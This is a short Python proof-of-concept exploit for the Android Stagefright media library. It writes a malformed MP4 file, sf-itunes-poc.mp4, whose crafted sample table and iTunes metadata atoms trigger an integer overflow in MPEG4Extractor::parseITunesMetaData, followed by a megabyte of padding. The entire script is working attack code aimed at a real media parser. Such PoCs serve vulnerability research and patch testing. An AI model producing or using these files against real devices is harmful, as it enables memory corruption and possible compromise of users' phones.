#!/usr/bin/python

"""
Stagefright PoC for https://android.googlesource.com/platform/frameworks/av/+/2b50b7aa7d16014ccf35db7a7b4b5e84f7b4027c
"""
from struct import pack

def create_box(atom_type, data):
    return pack("!I", len(data)+4+4) + atom_type + data


ftyp_atom = create_box("ftyp", "mp42\x00\x00\x00\x00mp42isom")


# create one track for allocating some memory (also with size 0 bytes)
stco_atom = create_box("stco", pack("!I", 0) + pack("!I", 0))
stsc_atom = create_box("stsc", pack("!I", 0) + pack("!I", 0))
stsz_atom = create_box("stsz", pack("!I", 0) + pack("!II", 1, 1))
stts_atom = create_box("stts", pack("!I", 0) + pack("!I", 0))
stbl_atom = create_box("stbl", stco_atom + stsc_atom + stsz_atom + stts_atom)
trak_atom = create_box("trak", stbl_atom)


# replace SampleTable to make cache from freeing old one
stbl2_atom = create_box("stbl", "");


# Integer overflow in MPEG4Extractor::parseITunesMetaData() function
# moov.udta.meta.ilst.xxxx.data
data_atom = pack("!I", 1) + "data" + pack("!II", 1, 0xf)
anyx_atom = create_box("anyx", data_atom)
ilst_atom = create_box("ilst", anyx_atom)
meta_atom = create_box("meta", pack("!I", 0) + ilst_atom)
udta_atom = create_box("udta", meta_atom)
moov_atom = create_box("moov", udta_atom)


f = open('sf-itunes-poc.mp4', 'wb')
f.write(ftyp_atom)
f.write(trak_atom)
f.write(stbl2_atom)
f.write(trak_atom)
f.write(stbl2_atom)
f.write(moov_atom)
f.write("A"*(1024*1024))
f.close()
